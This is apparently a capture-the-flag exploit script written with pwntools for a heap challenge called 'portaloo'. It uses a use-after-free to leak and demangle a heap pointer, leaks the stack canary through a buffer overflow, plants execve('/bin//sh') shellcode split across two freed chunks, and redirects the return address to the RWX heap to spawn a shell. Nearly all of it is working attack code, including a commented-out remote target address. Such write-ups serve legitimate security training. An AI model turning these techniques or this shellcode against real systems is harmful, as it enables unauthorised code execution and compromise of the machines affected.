#!/usr/bin/python3.11

from pwn import *

exe = ELF("portaloo_patched", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "WARNING"
context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

# brva 0x0000000000001931	printf of any last words
# brva 0x0000000000001970	returning from jump into portal...

gs = '''
# set disable-randomization off
directory /opt/GLIBC_SOURCE_CODE
# b create_portal
# b destroy_portal
# b upgrade_portal
# b peek_into_the_void
# b step_into_the_portal
continue
brva 0x0000000000001970
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def demangle(obfus_ptr):
    o2 = (obfus_ptr >> 12) ^ obfus_ptr
    return (o2 >> 24) ^ o2

def mangle(ptr: int, addr: int) -> int:
	return ptr ^ (addr >> 12)

def create_portal(portalNumber: int):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(portalNumber).encode())
    
def destroy_portal(portalNumber: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(portalNumber).encode())
    
def upgrade_portal(portalNumber: int, data: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"number: ", str(portalNumber).encode())
    io.sendlineafter(b"data: ", data)
    
def peek_into_the_void() -> int:
    io.sendlineafter(b"> ", b"4")
    result = io.recv()
    heap_leak = int.from_bytes(result[58:64],'little')
    print(f"Leaked heap: {hex(heap_leak)}")
    heap_leak_demangled = demangle(heap_leak)
    print(f"Leaked heap demangled: {hex(heap_leak_demangled)}")
    return heap_leak_demangled - 0x2a0
  
def step_into_the_portal(firstInput: bytes) -> int:
    # input buffer is 72 bytes
    io.sendlineafter(b"> ", b"5")
    io.sendafter(b"> ", firstInput) # 80 bytes
    result = io.recv()
    leaked_canary_int = int.from_bytes(result.split(b"w" * 72)[1][0:8], 'little') & ~0xff
    print(f"{hex(leaked_canary_int)=}")
    pause()
    io.send(b"w" * 72 + p64(leaked_canary_int) + p64(0) + p64(heap_base+0x2a0)) # 104 bytes
    return leaked_canary_int
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
io = start_local(isDebug)

######## REMOTE ########
# remote_address = "83.136.253.71:42502"
# io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.2

# we create 2 malloc chunks
create_portal(0)
create_portal(1)

# we send them to tcache to get their fd pointers populated with heap addresses.
destroy_portal(0)
destroy_portal(1)

# We print out the chunks content and we demangle the fd of the second chunk, giving us a heap leak.
heap_base = peek_into_the_void()
print(f"Heap base: {hex(heap_base)}")

# full payload
# b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";
chunkA_payload = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\xeb\x20"
chunkB_payload = b"\x54\x5F\xF7\xEE\xB0\x3B\x0f\x05"

# We write after free into both chunks, 2 halgs of the payload. The first payload also contains a jmp 0x20 instruction which will jump to the next chunk
# in memory, reaching our second half of the payload.
upgrade_portal(0, chunkA_payload)
upgrade_portal(1, chunkB_payload)

# We leak the canary by overflowing the buffer with 73 bytes of garabge. The first 72 to reach canary, + 1 byte to make sure the canary's LSB is not 
# a null terminator. This will allow printf to print it out.
# Then we overflow again this time with 72 bytes of garnage + canary + RBP + return address with the address of the leaked heap.
step_into_the_portal(b"w" * 73)

# The function will return to the payload and execute it because the heap page is RWX.
io.interactive()
